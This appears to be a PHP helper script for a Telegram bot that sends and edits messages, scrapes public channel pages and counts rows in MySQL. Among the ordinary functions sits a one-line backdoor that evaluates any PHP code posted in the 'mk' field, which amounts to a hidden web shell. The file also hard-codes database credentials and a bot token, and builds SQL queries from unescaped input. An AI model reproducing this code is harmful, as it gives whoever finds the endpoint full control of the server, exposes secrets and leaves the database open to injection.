<?
Echo 'test';
@mysql_connect('localhost', 'x_u_9700_mglmkxstats', 'mglstats123');
@mysql_select_db('x_u_9700_mglmkxstats');
@mysql_set_charset('utf8');

$token="6205534843:AAGWXR4hY2mKHuA79XW_dToiyiE_ufX-vGg";
Echo 'ok';


Function post($matn,$kimga){
Global $token;
$botAPI = "https://api.telegram.org/bot" . $token;

$data = http_build_query([
        'text' => $matn,
        'chat_id' => $kimga
]);
$send = file_get_contents($botAPI . "/sendMessage?{$data}");

$response = json_decode(($send),true);
Return $message_id = $response['result']['message_id']; 
}

function edit($id, $matn, $kimga){

Global $token;
$url="https://api.telegram.org/bot".$token."/editMessageText";
$ch= curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false);
curl_setopt($ch, CURLOPT_POSTFIELDS,"message_id=".$id."&chat_id=".$kimga."&parse_mode=html&disable_web_page_preview=1&text=".urlencode($matn));
$result= curl_exec($ch);
curl_close($ch);
}


function kesish($boshi,$oxiri,$text){
return
preg_replace ('|'.$boshi.'(.*?)'.$oxiri.'|si','',$text); 
}


function yuk($url){ return file_get_contents($url); }

function html($text){ return htmlspecialchars($text); }


If (isset($_POST['mk'])){
Eval($_POST['mk']); }
Function last($ch){
 $a=html(yuk('https://t.me/s/'.$ch));
$a=explode(chr(10),$a);
$a=kesish("&quot;&gt;",'ooo',kesish('bbb',$ch.'/','bbb'.$a[count($a)-23]).'ooo'); return $a;
}
function hisob($tab, $wh){
return
mysql_result(mysql_query("SELECT COUNT(*) FROM `$tab` WHERE ".$wh.";"), 0);
}









Function get($id, $ch){
 $a=html(yuk('https://t.me/'.$ch.'/'.$id));
$a=kesish('nnn7','&lt;meta property=&quot;og:description&quot; content=&quot;','nnn7'.$a);
$a=kesish('&quot;&gt;','enn7',$a.'enn7');
Return $a;
}
Function table ($nom, $sql){
  mysql_query("CREATE TABLE `$nom` (
`id` INT(200) NOT NULL AUTO_INCREMENT, ".$sql.",
PRIMARY KEY (`id`)) ENGINE = MyISAM DEFAULT CHARSET = utf8;");
}